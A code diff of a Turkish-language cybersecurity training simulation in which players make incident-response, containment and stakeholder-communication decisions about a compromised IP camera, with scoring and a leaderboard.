-      <blockquote class="italic text-gray-400 border-l-4 border-green-500 pl-4 mt-4">Alper: "Tamam, şimdi her şey oturdu. Kameradaki yavaşlama bir arıza değil, bir semptom. Cihaz, bilinen bir zafiyet üzerinden ele geçirilmiş, bir payload indirmiş ve bir botnet parçası olarak C2 sunucusuna veri gönderiyor. Acilen yöneticimiz Ceyda'ya raporlamalıyız."</blockquote>
-      <button onclick="nextStep('step3_5')" class="bg-green-600 hover:bg-green-700 px-4 py-2 rounded">Bulguları Raporla</button>
-    </section>
-    
-    <section id="step3_5" class="step space-y-4" style="display:none;">
-        <h2 class="text-xl text-orange-300 font-semibold">🕒 08:30 – Ani Komplikasyon: Yönetim Baskısı</h2>
-        <p>Tam Alper bulgularını Ceyda'ya sunmaya hazırlanırken, telefonu çalar. Arayan, Satış Direktörüdür ve sesi oldukça gergindir.</p>
-        <img src="toplanti.png" alt="Toplantı Odası" class="rounded-xl border-2 shadow-lg border-orange-400 w-full max-w-md mx-auto object-cover">
-        <blockquote class="italic text-gray-400 border-l-4 border-orange-500 pl-4 mt-4">Satış Direktörü: "Ekibiniz Okyanus Odası'ndaki kamerayla mı uğraşıyor? O kameranın 1 saat içinde çalışır durumda olması lazım, çok önemli bir yabancı müşteriye canlı demo sunumu yapacağız! Odayı kapatamazsınız, hemen bir çözüm bulun!"</blockquote>
-        <p>Bu yeni bilgi, verilecek kararın sadece teknik değil, aynı zamanda operasyonel bir boyutu olduğunu da ortaya koyuyor. Ekip üzerindeki baskı artmıştır.</p>
-        <button onclick="nextStep('step4')" class="mt-4 bg-orange-600 hover:bg-orange-700 px-4 py-2 rounded">Baskı Altında Kriz Toplantısı Planla</button>
-    </section>
-
-    <section id="step4" class="step space-y-4" style="display:none;">
-      <h2 class="text-xl text-indigo-300 font-semibold">🏢 08:45 – Kriz Toplantısı ve Karar Anı</h2>
-      <p>Alper, durumu Siber Güvenlik Yöneticisi Ceyda'ya özetler: "CVE-2025-1337 zafiyeti kullanılarak ele geçirilmiş bir IP kameramız var. Şimdilik sadece 'beaconing' aktivitesi gibi görünen küçük veri paketleriyle dışarıyla haberleşiyor. Ağ içinde yanal bir hareket tespit etmedik. Ancak Satış Departmanı'nın 1 saatten az bir süre içinde o kameraya ihtiyacı var."</p>
-      <blockquote class="italic text-gray-400 border-l-4 border-indigo-500 pl-4">Ceyda: "Anlaşıldı. Zamanımız kısıtlı ve baskı altındayız. Elimizde üç seçenek var gibi görünüyor. Karar sizin. Ne yapıyoruz?"</blockquote>
-      <p class="font-bold text-yellow-300">Ekip olarak kararınızı verin:</p>
-      <div class="flex flex-col md:flex-row gap-4 mt-4">
-        <div class="w-full md:w-1/3 bg-gray-800 p-4 rounded-lg border border-gray-700 flex flex-col">
-          <h3 class="text-lg font-bold text-green-400">Seçenek A: İzole Et ve Yamala (Güvenli Yol)</h3>
-          <p class="text-sm text-gray-300 mt-2 flex-grow">Kamerayı derhal ağdan ayır. Cihazı laboratuvar ortamına al, imajını yakala ve en son firmware ile güncelle. Tehdit anında durdurulur.</p>
-          <p class="text-xs text-yellow-400 mt-2"><strong>Risk:</strong> Saldırganın kim olduğu veya nihai hedefinin ne olduğu hakkında daha fazla bilgi edinemeyiz. Satış sunumu iptal olur.</p>
-          <button onclick="nextStep('step_report_safe')" class="mt-4 w-full bg-green-600 hover:bg-green-700 px-4 py-2 rounded">Seçenek A'yı Uygula</button>
-        </div>
-        <div class="w-full md:w-1/3 bg-gray-800 p-4 rounded-lg border border-gray-700 flex flex-col">
-          <h3 class="text-lg font-bold text-red-400">Seçenek B: Honeypot'a Yönlendir (Riskli Gözlem)</h3>
-          <p class="text-sm text-gray-300 mt-2 flex-grow">Kameranın trafiğini, ana ağdan tamamen izole bir "Honeypot" (Bal Küpü) ortamına yönlendir. Saldırganın davranışlarını (TTP'ler) gizlice izleyerek değerli istihbarat topla.</p>
-          <p class="text-xs text-yellow-400 mt-2"><strong>Risk:</strong> Saldırgan Honeypot'u fark edebilir veya gözlem sırasında daha agresif bir saldırı (örn: fidye yazılımı) başlatabilir.</p>
-          <button onclick="nextStep('step_report_risk')" class="mt-4 w-full bg-red-600 hover:bg-red-700 px-4 py-2 rounded">Seçenek B'yi Uygula</button>
-        </div>
-        <div class="w-full md:w-1/3 bg-gray-800 p-4 rounded-lg border border-gray-700 flex flex-col">
-            <h3 class="text-lg font-bold text-blue-400">Seçenek C: Karantinaya Al ve Gözlemle (Hesaplı Orta Yol)</h3>
-            <p class="text-sm text-gray-300 mt-2 flex-grow">Kamerayı internet erişimi olmayan, izole bir VLAN'a taşı. Cihazın internete çıkışını engelle ama yerel ağdaki 'yem' varlıklara ne yapmaya çalıştığını gözlemle. Bu, yanal hareket denemelerini açığa çıkarabilir.</p>
-            <p class="text-xs text-yellow-400 mt-2"><strong>Risk:</strong> Yapılandırma hatası saldırganın karantinadan kaçmasına neden olabilir. Satış sunumu yine de gecikebilir.</p>
-            <button onclick="nextStep('step_report_quarantine')" class="mt-4 w-full bg-blue-600 hover:bg-blue-700 px-4 py-2 rounded">Seçenek C'yi Uygula</button>
-        </div>
-      </div>
-    </section>
-
-    <section id="step_report_safe" class="step space-y-4" style="display:none;">
-      <h2 class="text-xl text-green-300 font-semibold">📊 Nihai Rapor: Tehdit Kontrol Altına Alındı</h2>
-      <p>Ekip, A Seçeneğini uygulamaya karar verdi. Kameranın portu derhal kapatıldı ve cihaz laboratuvara taşındı. Satış sunumu iptal edildi.</p>
-      
-      <div class="bg-gray-800 p-4 rounded-lg border border-green-500">
-        <h3 class="text-lg font-semibold text-white mb-3">Kararınızın Sonuçları:</h3>
-        <div class="grid grid-cols-2 md:grid-cols-4 gap-4 text-center">
-            <div>
-                <p class="text-sm text-gray-400">Etkilenen Sistemler</p>
-                <p class="text-2xl font-bold text-yellow-400">1</p>
+        <section id="step3_2" class="step space-y-4" style="display:none;">
+            <h2 class="text-xl text-cyan-300 font-semibold">🕵️‍♂️ 08:15 – Soruşturmayı Derinleştirme: Düşmanın Niyeti Ne?</h2>
+            <p>Alper'in bulguları net: Cihaz ele geçirilmiş. Ancak düşmanın asıl amacı ne? Sadece bir DDoS botnet'i mi, yoksa daha büyük bir planın ilk adımı mı? Ceyda, bir sonraki adımı belirlemeniz için size dönüyor.</p>
+            <blockquote class="italic text-gray-400 border-l-4 border-cyan-500 pl-4">Ceyda: "Giriş noktasını bulduk, güzel iş. Şimdi neyin peşinde olduklarını anlamamız lazım. Üç seçeneğimiz var: Dışarıyı mı araştıralım, içeriye mi odaklanalım, yoksa yayılımı mı kontrol edelim?"</blockquote>
+            <div class="flex flex-col md:flex-row gap-4 mt-4">
+                <div class="w-full md:w-1/3 bg-gray-800 p-4 rounded-lg border border-gray-700 flex flex-col">
+                  <h3 class="text-lg font-bold text-blue-400">Seçenek A: C2 Sunucusunu Analiz Et</h3>
+                  <p class="text-sm text-gray-300 mt-2 flex-grow">Hedef IP ve domain'i Tehdit İstihbaratı platformlarında (VirusTotal, Shodan vb.) araştır. Bu, saldırganın kimliği ve TTP'leri (Taktik, Teknik, Prosedürler) hakkında bilgi verebilir.</p>
+                  <button class="btn mt-4 w-full" data-decision="step3_2-c2" data-next-section="step3_5" style="background-color: var(--accent-blue); color: var(--text-dark);"><i class="fas fa-globe"></i> Dış Tehditleri Araştır</button>
+                </div>
+                <div class="w-full md:w-1/3 bg-gray-800 p-4 rounded-lg border border-gray-700 flex flex-col">
+                  <h3 class="text-lg font-bold text-yellow-400">Seçenek B: Payload'ı Analiz Et</h3>
+                  <p class="text-sm text-gray-300 mt-2 flex-grow">Cihaza indirilen 'payload.sh' betiğini ve 'c2.pl' Perl betiğini sandbox ortamında incele. Zararlının tam olarak ne yaptığını, hangi yeteneklere sahip olduğunu (örn: ağ tarama) öğren.</p>
+                  <button class="btn mt-4 w-full" data-decision="step3_2-payload" data-next-section="step3_5" style="background-color: var(--accent-yellow); color: var(--text-dark);"><i class="fas fa-bug"></i> Zararlıyı Analiz Et</button>
+                </div>
+                <div class="w-full md:w-1/3 bg-gray-800 p-4 rounded-lg border border-gray-700 flex flex-col">
+                    <h3 class="text-lg font-bold text-green-400">Seçenek C: İç Ağ Taraması Yap</h3>
+                    <p class="text-sm text-gray-300 mt-2 flex-grow">Ağdaki diğer "SmartEye 3000" model kameraları bulmak için acil bir tarama başlat. Zafiyetin ne kadar yaygın olduğunu anla ve potansiyel diğer kurbanları belirle.</p>
+                    <button class="btn mt-4 w-full" data-decision="step3_2-scan" data-next-section="step3_5" style="background-color: var(--accent-green); color: var(--text-dark);"><i class="fas fa-network-wired"></i> Yayılımı Kontrol Et</button>
+                </div>
             </div>
-            <div>
-                <p class="text-sm text-gray-400">Finansal Zarar</p>
-                <p class="text-2xl font-bold text-yellow-400">₺50.000</p>
-            </div>
-            <div>
-                <p class="text-sm text-gray-400">Veri Kaybı</p>
-                <p class="text-2xl font-bold text-green-400">0%</p>
-            </div>
-            <div>
-                <p class="text-sm text-gray-400">İtibar Puanı</p>
-                <p class="text-2xl font-bold text-green-400">95/100</p>
-            </div>
-        </div>
-      </div>
-
-      <ul class="list-disc list-inside text-gray-300 space-y-2 bg-gray-800 p-4 rounded-lg mt-4">
-        <li><strong>Eylem:</strong> Cihaz ağdan izole edildi, imajı adli analiz için alındı.</li>
-        <li><strong>Bulgu:</strong> Analizde, cihazı bir DDoS botnet'ine dahil etmek için kullanılan basit bir Perl betiği bulundu.</li>
-        <li><strong>Çözüm:</strong> Cihazın firmware'i güncellenerek zafiyet kapatıldı. Ağ taraması, yamalanması gereken aynı modeldeki 3 kamerayı daha ortaya çıkardı ve onlar da güncellendi.</li>
-        <li><strong>Sonuç:</strong> Veri sızıntısı yaşanmadı. Operasyonel aksama (iptal edilen sunum) nedeniyle küçük bir maliyet oluştu, ancak kriz büyümeden önlendi.</li>
-      </ul>
-      <button onclick="nextStep('final')" class="mt-4 bg-cyan-600 hover:bg-cyan-700 px-4 py-2 rounded">Alınan Derslere Geç</button>
-    </section>
-    
-    <section id="step_report_risk" class="step space-y-4" style="display:none;">
-      <h2 class="text-xl text-red-400 font-semibold">🚨 Nihai Rapor: Kriz Büyüdü!</h2>
-      <p>Ekip, B Seçeneğini uygulamaya karar verdi. Ancak tecrübeli saldırgan, Honeypot'u fark ederek agresif bir saldırı başlattı.</p>
-
-      <div class="bg-gray-800 p-4 rounded-lg border border-red-500">
-        <h3 class="text-lg font-semibold text-white mb-3">Kararınızın Sonuçları:</h3>
-        <div class="grid grid-cols-2 md:grid-cols-4 gap-4 text-center">
-            <div>
-                <p class="text-sm text-gray-400">Etkilenen Sistemler</p>
-                <p class="text-2xl font-bold text-red-400">4+</p>
-            </div>
-            <div>
-                <p class="text-sm text-gray-400">Finansal Zarar</p>
-                <p class="text-2xl font-bold text-red-400">₺15.000.000+</p>
-            </div>
-            <div>
-                <p class="text-sm text-gray-400">Veri Kaybı</p>
-                <p class="text-2xl font-bold text-red-400">40%</p>
-            </div>
-            <div>
-                <p class="text-sm text-gray-400">İtibar Puanı</p>
-                <p class="text-2xl font-bold text-red-400">20/100</p>
-            </div>
-        </div>
-      </div>
-
-      <ul class="list-disc list-inside text-gray-300 space-y-2 bg-gray-800 p-4 rounded-lg mt-4">
-        <li><strong>Eylem:</strong> İzlenildiğini anlayan saldırgan, planını değiştirerek elindeki erişimden sonuna kadar faydalanmaya karar verdi.</li>
-        <li><strong>Bulgu:</strong> Kameradan ağdaki diğer zafiyetli sistemleri taramaya başladı. Zayıf bir servis hesabı şifresini kırarak bir dosya sunucusuna yanal hareket gerçekleştirdi.</li>
-        <li><strong>Sonuç:</strong> Saldırgan, Finans ve İK departmanlarının kritik verilerini barındıran sunuculara fidye yazılımı (ransomware) bulaştırdı. Şirket operasyonları durma noktasına geldi.</li>
-        <li><strong>Kriz Yönetimi:</strong> Olay, bir veri ihlaline ve büyük bir operasyonel krize dönüştü. Kurtarma çalışmaları, danışmanlık ücretleri ve iş kaybı maliyeti devasa boyutlara ulaştı.</li>
-      </ul>
-      <button onclick="nextStep('final')" class="mt-4 bg-cyan-600 hover:bg-cyan-700 px-4 py-2 rounded">Alınan Derslere Geç</button>
-    </section>
-
-    <section id="step_report_quarantine" class="step space-y-4" style="display:none;">
-        <h2 class="text-xl text-blue-300 font-semibold">📊 Nihai Rapor: İstihbarat Toplandı, Tehdit Etkisiz Hale Getirildi</h2>
-        <p>Ekip, C Seçeneğini uygulamaya karar verdi. Kamera, internet erişimi olmayan özel bir VLAN'a taşındı ve tüm aktiviteleri izlendi.</p>
+        </section>
         
-        <div class="bg-gray-800 p-4 rounded-lg border border-blue-500">
-            <h3 class="text-lg font-semibold text-white mb-3">Kararınızın Sonuçları:</h3>
-            <div class="grid grid-cols-2 md:grid-cols-4 gap-4 text-center">
-                <div>
-                    <p class="text-sm text-gray-400">Etkilenen Sistemler</p>
-                    <p class="text-2xl font-bold text-green-400">1</p>
+        <section id="step3_5" class="step space-y-4" style="display:none;">
+            <h2 class="text-xl text-orange-300 font-semibold">🕒 08:30 – Ani Komplikasyon: Yönetim Baskısı</h2>
+            <p>Tam analiziniz sonuçlanırken, Satış Direktöründen o beklenen telefon gelir. Sesi oldukça gergindir.</p>
+            <img src="toplanti.png" alt="Toplantı Odası" class="rounded-xl border-2 shadow-lg border-orange-400 w-full max-w-md mx-auto object-cover">
+             <div id="intel-report" class="bg-gray-800 p-4 rounded-lg border border-cyan-500 mt-4"></div>
+            <blockquote class="italic text-gray-400 border-l-4 border-orange-500 pl-4 mt-4">Satış Direktörü: "Ekibiniz Okyanus Odası'ndaki kamerayla mı uğraşıyor? O kameranın 1 saat içinde çalışır durumda olması lazım, çok önemli bir yabancı müşteriye canlı demo sunumu yapacağız! Odayı kapatamazsınız, hemen bir çözüm bulun!"</blockquote>
+            <p>Bu yeni bilgi, verilecek kararın sadece teknik değil, aynı zamanda operasyonel bir boyutu olduğunu da ortaya koyuyor. Ekip üzerindeki baskı artmıştır.</p>
+            <button class="btn btn-continue" data-next-section="step4" style="background-color: #ffb86c; color: var(--text-dark);"><i class="fas fa-users"></i> Baskı Altında Kriz Toplantısı Planla</button>
+        </section>
+
+        <section id="step4" class="step space-y-4" style="display:none;">
+            <h2 class="text-xl text-indigo-300 font-semibold">🏢 08:45 – Kriz Toplantısı ve Nihai Karar</h2>
+            <p>Siber Güvenlik Yöneticisi Ceyda'ya son durumu özetlersiniz: "CVE-2025-1337 zafiyeti kullanılarak ele geçirilmiş bir IP kameramız var. Sadece dışarıyla haberleşmiyor, aynı zamanda <strong class='text-yellow-300' id="dynamic-info-placeholder">elimizdeki ilk bilgilere göre hareket ediyor</strong>. Ağ içinde henüz bir yanal hareket tespit etmedik. Ancak Satış Departmanı'nın 1 saatten az bir süre içinde o kameraya ihtiyacı var."</p>
+            <blockquote class="italic text-gray-400 border-l-4 border-indigo-500 pl-4">Ceyda: "Anlaşıldı. Zamanımız kısıtlı ve baskı altındayız. Elimizde üç seçenek var gibi görünüyor. Karar sizin. Ne yapıyoruz?"</blockquote>
+            <p class="font-bold text-yellow-300">Ekip olarak kararınızı verin:</p>
+            <div class="flex flex-col md:flex-row gap-4 mt-4">
+                <div class="w-full md:w-1/3 bg-gray-800 p-4 rounded-lg border border-gray-700 flex flex-col">
+                  <h3 class="text-lg font-bold text-green-400">Seçenek A: İzole Et ve Yamala (Güvenli Yol)</h3>
+                  <p class="text-sm text-gray-300 mt-2 flex-grow">Kamerayı derhal ağdan ayır. Cihazı laboratuvar ortamına al, imajını yakala ve en son firmware ile güncelle. Tehdit anında durdurulur.</p>
+                  <p class="text-xs text-yellow-400 mt-2"><strong>Risk:</strong> Saldırganın nihai hedefi hakkında daha fazla bilgi edinemeyiz. Satış sunumu iptal olur.</p>
+                  <button class="btn mt-4 w-full" data-decision="step4-isolate" data-next-section="step5" style="background-color: var(--accent-green); color: var(--text-dark);"><i class="fas fa-check-circle"></i> Seçenek A'yı Uygula</button>
                 </div>
-                <div>
-                    <p class="text-sm text-gray-400">Finansal Zarar</p>
-                    <p class="text-2xl font-bold text-green-400">₺5.000</p>
+                <div class="w-full md:w-1/3 bg-gray-800 p-4 rounded-lg border border-gray-700 flex flex-col">
+                  <h3 class="text-lg font-bold text-red-400">Seçenek B: Honeypot'a Yönlendir (Riskli Gözlem)</h3>
+                  <p class="text-sm text-gray-300 mt-2 flex-grow">Kameranın trafiğini, ana ağdan tamamen izole bir "Honeypot" (Bal Küpü) ortamına yönlendir. Saldırganın davranışlarını (TTP'ler) gizlice izleyerek değerli istihbarat topla.</p>
+                  <p class="text-xs text-yellow-400 mt-2"><strong>Risk:</strong> Saldırgan Honeypot'u fark edebilir veya gözlem sırasında daha agresif bir saldırı (örn: fidye yazılımı) başlatabilir.</p>
+                  <button class="btn mt-4 w-full" data-decision="step4-honeypot" data-next-section="step5" style="background-color: var(--accent-red);"><i class="fas fa-biohazard"></i> Seçenek B'yi Uygula</button>
                 </div>
-                <div>
-                    <p class="text-sm text-gray-400">Veri Kaybı</p>
-                    <p class="text-2xl font-bold text-green-400">0%</p>
-                </div>
-                <div>
-                    <p class="text-sm text-gray-400">İtibar Puanı</p>
-                    <p class="text-2xl font-bold text-green-400">100/100</p>
+                <div class="w-full md:w-1/3 bg-gray-800 p-4 rounded-lg border border-gray-700 flex flex-col">
+                    <h3 class="text-lg font-bold text-blue-400">Seçenek C: Karantinaya Al ve Gözlemle (Hesaplı Orta Yol)</h3>
+                    <p class="text-sm text-gray-300 mt-2 flex-grow">Kamerayı internet erişimi olmayan, izole bir VLAN'a taşı. Cihazın internete çıkışını engelle ama yerel ağdaki 'yem' varlıklara ne yapmaya çalıştığını gözlemle. Bu, yanal hareket denemelerini açığa çıkarabilir.</p>
+                    <p class="text-xs text-yellow-400 mt-2"><strong>Risk:</strong> Yapılandırma hatası saldırganın karantinadan kaçmasına neden olabilir. Satış sunumu yine de gecikebilir.</p>
+                    <button class="btn mt-4 w-full" data-decision="step4-quarantine" data-next-section="step5" style="background-color: var(--accent-blue); color: var(--text-dark);"><i class="fas fa-balance-scale"></i> Seçenek C'yi Uygula</button>
                 </div>
             </div>
-        </div>
+        </section>
 
-        <ul class="list-disc list-inside text-gray-300 space-y-2 bg-gray-800 p-4 rounded-lg mt-4">
-          <li><strong>Eylem:</strong> Kamera izole VLAN'da çalışır durumda bırakıldı ve tüm aktiviteleri NDR (Ağ Tespiti ve Müdahale) aracıyla izlendi.</li>
-          <li><strong>Bulgu:</strong> Saldırganın, kameradan yerel ağa doğru `nmap` ile port taraması yapmaya çalıştığı tespit edildi. Bu davranış, saldırganın TTP'leri (Taktik, Teknik, Prosedürler) hakkında değerli istihbarat sağladı.</li>
-          <li><strong>Çözüm:</strong> Elde edilen istihbaratla, diğer kameraları yamalamadan önce bu tür yanal hareketleri engelleyecek özel güvenlik duvarı kuralları yazıldı. Ardından tüm savunmasız kameralar güvenli bir şekilde güncellendi.</li>
-          <li><strong>Sonuç:</strong> Hem tehdit durduruldu hem de gelecekteki benzer saldırıları proaktif olarak engellemek için değerli bilgiler toplandı. Satış sunumunda yaşanan küçük gecikme dışında kayda değer bir kayıp yaşanmadı.</li>
-        </ul>
-        <button onclick="nextStep('final')" class="mt-4 bg-cyan-600 hover:bg-cyan-700 px-4 py-2 rounded">Alınan Derslere Geç</button>
-    </section>
-
-    <section id="final" class="step space-y-6" style="display:none;">
-      <h2 class="text-2xl font-semibold text-cyan-300 text-center">📌 Kapanış: Vaka Analizi ve Alınan Dersler</h2>
-      <div class="bg-gray-800 p-4 rounded-lg border border-gray-700">
-        <h3 class="text-xl font-semibold text-green-400">Teknik Dersler</h3>
-        <ul class="list-disc list-inside text-gray-300 mt-2 space-y-1">
-          <li><strong>Varlık Yönetimi:</strong> Ağdaki tüm cihazların (özellikle IoT) güncel bir envanterini tutmak, olay anında hızlı teşhis için kritiktir.</li>
-          <li><strong>Ağ Segmentasyonu:</strong> IoT cihazları, kritik sunuculardan ve kullanıcı ağlarından izole, ayrı VLAN'larda tutulmalıdır. Bu, yanal hareketi zorlaştırır.</li>
-          <li><strong>Zafiyet Yönetimi:</strong> Cihaz firmware ve yazılımları için düzenli zafiyet taramaları yapılmalı, yamalar hızla uygulanmalıdır.</li>
-          <li><strong>Aldatma Teknolojileri (Deception):</strong> Honeypot ve izole gözlem ortamları, doğru kullanıldığında, saldırganların taktiklerini anlamak için güçlü araçlardır.</li>
-        </ul>
-      </div>
-      <div class="bg-gray-800 p-4 rounded-lg border border-gray-700">
-        <h3 class="text-xl font-semibold text-yellow-400">Prosedürel Dersler</h3>
-        <ul class="list-disc list-inside text-gray-300 mt-2 space-y-1">
-          <li><strong>Olay Önceliklendirme:</strong> Birden fazla uyarı olduğunda, potansiyel etkiye göre doğru önceliklendirme yapmak, kaynakların verimli kullanılmasını sağlar.</li>
-          <li><strong>SIEM Kurallarının İyileştirilmesi:</strong> Anormal veri sızıntısı ve beaconing gibi aktiviteleri tespit eden korelasyon kurallarının hassasiyeti sürekli geliştirilmelidir.</li>
-          <li><strong>Departmanlar Arası İletişim:</strong> Yardım Masası'ndan gelen kullanıcı şikayetlerini SOC uyarılarıyla ilişkilendirmek, olayların erken tespiti için hayati önem taşır.</li>
-        </ul>
-      </div>
-       <div class="bg-gray-800 p-4 rounded-lg border border-gray-700">
-        <h3 class="text-xl font-semibold text-indigo-400">Stratejik Dersler</h3>
-        <ul class="list-disc list-inside text-gray-300 mt-2 space-y-1">
-          <li><strong>Risk İştahı:</strong> "İstihbarat toplama" ile "riski hemen ortadan kaldırma" arasındaki denge, her olayda yönetimle birlikte dikkatle değerlendirilmelidir.</li>
-          <li><strong>Baskı Yönetimi:</strong> Olay müdahalesi sırasında iş birimlerinden gelebilecek operasyonel baskıları yönetmek, siber güvenlik karar süreçlerinin ayrılmaz bir parçasıdır.</li>
-          <li><strong>Erken Müdahalenin Değeri:</strong> Şüpheli bir aktivite tespit edildiğinde hızlı ve kararlı hareket etmek, potansiyel bir krizi önlemenin en etkili yoludur.</li>
-        </ul>
-      </div>
-      <div class="text-center mt-6">
-        <button onclick="nextStep('step0')" class="bg-blue-600 hover:bg-blue-700 px-6 py-3 rounded-lg font-bold">Simülasyonu Yeniden Başlat</button>
-        <p class="text-center text-sm text-gray-500 mt-8">ShadowCircuit v6 – © 2025 ÇOLHAK</p>
-      </div>
-    </section>
+        <section id="step5" class="step space-y-4" style="display:none;">
+            <h2 class="text-xl text-purple-300 font-semibold">📞 09:00 – İletişim Krizi: Paydaş Yönetimi</h2>
+            <p>Teknik müdahale kararınız uygulamaya konulurken, Ceyda yanınıza gelir. Yüzü endişelidir. "Teknik taraf kontrol altında gibi, ama telefonlarım susmuyor. Satış Direktörü demonun akıbetini soruyor, CFO ise olası finansal etki raporu istiyor. Şirket içinde durumu nasıl yöneteceğiz? Resmi pozisyonumuz ne olmalı?"</p>
+            <blockquote class="italic text-gray-400 border-l-4 border-purple-500 pl-4 mt-4">Ceyda: "Teknik müdahale kadar önemli bir andayız. Vereceğin tavsiye, şirketin bu krizi içerde nasıl algılayacağını belirleyecek. Ne söylüyoruz?"</blockquote>
+            <div class="flex flex-col md:flex-row gap-4 mt-4">
+                <div class="w-full md:w-1/3 bg-gray-800 p-4 rounded-lg border border-gray-700 flex flex-col">
+                    <h3 class="text-lg font-bold text-green-400">Seçenek A: Tam Şeffaflık</h3>
+                    <p class="text-sm text-gray-300 mt-2 flex-grow">Satış Direktörüne demonun kritik bir siber güvenlik olayı nedeniyle kesin olarak iptal edildiğini bildir. CFO'ya durumu tüm çıplaklığıyla anlat ve olası en kötü senaryo için hazırlıklı olmalarını sağla.</p>
+                    <button class="btn mt-4 w-full" data-decision="step5-transparent" data-next-section="finalSection" style="background-color: var(--accent-green); color: var(--text-dark);"><i class="fas fa-bullhorn"></i> Şeffaf Ol</button>
+                </div>
+                <div class="w-full md:w-1/3 bg-gray-800 p-4 rounded-lg border border-gray-700 flex flex-col">
+                    <h3 class="text-lg font-bold text-yellow-400">Seçenek B: Kontrollü Bilgi Akışı</h3>
+                    <p class="text-sm text-gray-300 mt-2 flex-grow">Satış'a 'geçici bir ağ sorunu' olduğunu söyle ve durumu kurtarmaya çalıştığınızı belirt. CFO'ya ise durumu 'kontrol altında bir olay' olarak raporla, panik yaratmaktan kaçın.</p>
+                    <button class="btn mt-4 w-full" data-decision="step5-controlled" data-next-section="finalSection" style="background-color: var(--accent-yellow); color: var(--text-dark);"><i class="fas fa-comment-dots"></i> Durumu Yönet</button>
+                </div>
+                <div class="w-full md:w-1/3 bg-gray-800 p-4 rounded-lg border border-gray-700 flex flex-col">
+                    <h3 class="text-lg font-bold text-red-400">Seçenek C: Teknik Odaklanma</h3>
+                    <p class="text-sm text-gray-300 mt-2 flex-grow">'Benim önceliğim bu tehdidi durdurmak, iletişim sizin işiniz.' diyerek sadece teknik operasyona odaklan. Yönetimin kendi arasında durumu çözmesini sağla.</p>
+                    <button class="btn mt-4 w-full" data-decision="step5-technical" data-next-section="finalSection" style="background-color: var(--accent-red);"><i class="fas fa-laptop-code"></i> Sadece Tekniğe Odaklan</button>
+                </div>
+            </div>
+        </section>
+        
+        <section id="finalSection" class="step space-y-6 text-center" style="display:none;">
+            <h2 class="text-2xl font-semibold text-cyan-300">Kriz Sonrası Değerlendirme Raporu</h2>
+            <p>Simülasyon tamamlandı. Kriz yönetimi performansınızın detaylı dökümü aşağıdadır.</p>
+            <div id="performance-badge-container"><span id="performance-badge"></span></div>
+            <div class="final-metrics" id="finalMetricsContainer"></div>
+            <div class="post-crisis-layout">
+                <div class="event-timeline">
+                    <h3><i class="fas fa-timeline"></i> Karar Zaman Tüneli</h3>
+                    <ul id="decision-timeline-list"></ul>
+                </div>
+                <div class="strategic-debrief">
+                    <h3><i class="fas fa-lightbulb"></i> Stratejik Değerlendirme</h3>
+                    <div id="strategic-debrief-content"></div>
+                    <h3 style="margin-top: 20px;"><i class="fas fa-calculator"></i> Puan Dökümü</h3>
+                    <ul id="score-breakdown"></ul>
+                </div>
+            </div>
+            <div class="flex justify-center mt-6 gap-4">
+              <button class="btn btn-start" onclick="window.location.reload()"><i class="fas fa-redo"></i> Simülasyonu Yeniden Başlat</button>
+              <button id="openLeaderboardBtn" class="btn"><i class="fas fa-trophy"></i> Liderlik Tablosu</button>
+            </div>
+        </section>
+    </div>
   </div>
+
+  <div class="lb-overlay" id="leaderboardOverlay" role="dialog">
+      <div class="lb-modal">
+          <div class="lb-header">
+              <h2 class="lb-title"><i class="fas fa-trophy"></i> Liderlik Tablosu</h2>
+          </div>
+          <div class="lb-tablewrap">
+              <table class="lb-table" id="leaderboardTable">
+                  <thead>
+                      <tr><th>#</th><th>İsim</th><th>Puan</th><th>Tarih</th></tr>
+                  </thead>
+                  <tbody id="leaderboardBody">
+                      <tr><td colspan="4">Yükleniyor…</td></tr>
+                  </tbody>
+              </table>
+          </div>
+          <div class="lb-actions">
+              <button class="lb-refresh" id="lbRefreshBtn"><i class="fas fa-sync-alt"></i> Yenile</button>
+              <button class="lb-close" id="lbCloseBtn">Kapat</button>
+          </div>
+      </div>
+  </div>
+
+<script>
+document.addEventListener('DOMContentLoaded', () => {
+    const game = {
+        score: { affectedSystems: 1, financialLoss: 0, reputation: 100, intelScore: 0 },
+        state: { currentSection: 'step0', decisionHistory: [], knownVulnerableDevices: 1 },
+        elements: {},
+        timer: { total: 300, remaining: 300, intervalId: null, running: false },
+        decisionInfo: {
+            'step2-camera': { title: "Öncelik: Kamera Olayı", impact: 'Positive' },
+            'step2-cfo': { title: "Öncelik: CFO Hesabı", impact: 'Negative', changes: { financialLoss: 10000, reputation: -5 } },
+            'step3_2-c2': { title: "İstihbarat: C2 Analizi", impact: 'Positive', changes: { intelScore: 40 } },
+            'step3_2-payload': { title: "İstihbarat: Payload Analizi", impact: 'Positive', changes: { intelScore: 30 } },
+            'step3_2-scan': { title: "İstihbarat: İç Ağ Taraması", impact: 'Positive', changes: { intelScore: 20 } },
+            'step4-isolate': { title: "Müdahale: İzole Et ve Yamala", impact: 'Neutral', changes: { financialLoss: 50000, reputation: -5 } },
+            'step4-honeypot': { title: "Müdahale: Honeypot'a Yönlendir", impact: 'Negative', changes: { financialLoss: 15000000, reputation: -80, affectedSystems: 4 } },
+            'step4-quarantine': { title: "Müdahale: Karantinaya Al", impact: 'Positive', changes: { financialLoss: 5000, reputation: 5, intelScore: 50 } },
+            'step5-transparent': { title: "İletişim: Tam Şeffaflık", impact: 'Positive', changes: { reputation: 10 } },
+            'step5-controlled': { title: "İletişim: Kontrollü Bilgi", impact: 'Neutral', changes: { reputation: -10 } },
+            'step5-technical': { title: "İletişim: Teknik Odaklanma", impact: 'Negative', changes: { reputation: -20 } }
+        },
+
+        setup() {
+            this.elements = {
+                gameContainer: document.getElementById('gameContainer'),
+                gameContent: document.getElementById('game-content'),
+                startButton: document.getElementById('startButton'),
+                openLeaderboardBtn: document.getElementById('openLeaderboardBtn'),
+                statusBar: {
+                    affectedSystems: document.getElementById('status-affectedSystems'),
+                    financialLoss: document.getElementById('status-financialLoss'),
+                    reputation: document.getElementById('status-reputation'),
+                    intelScore: document.getElementById('status-intelScore'),
+                    timer: document.getElementById('status-timer').querySelector('.value')
+                },
+                leaderboard: {
+                    overlay: document.getElementById('leaderboardOverlay'),
+                    body: document.getElementById('leaderboardBody'),
+                    btnClose: document.getElementById('lbCloseBtn'),
+                    btnRefresh: document.getElementById('lbRefreshBtn'),
+                },
+                final: {
+                    badge: document.getElementById('performance-badge'),
+                    metricsContainer: document.getElementById('finalMetricsContainer'),
+                    timelineList: document.getElementById('decision-timeline-list'),
+                    debriefContent: document.getElementById('strategic-debrief-content'),
+                    scoreBreakdown: document.getElementById('score-breakdown')
+                }
+            };
+            this.attachListeners();
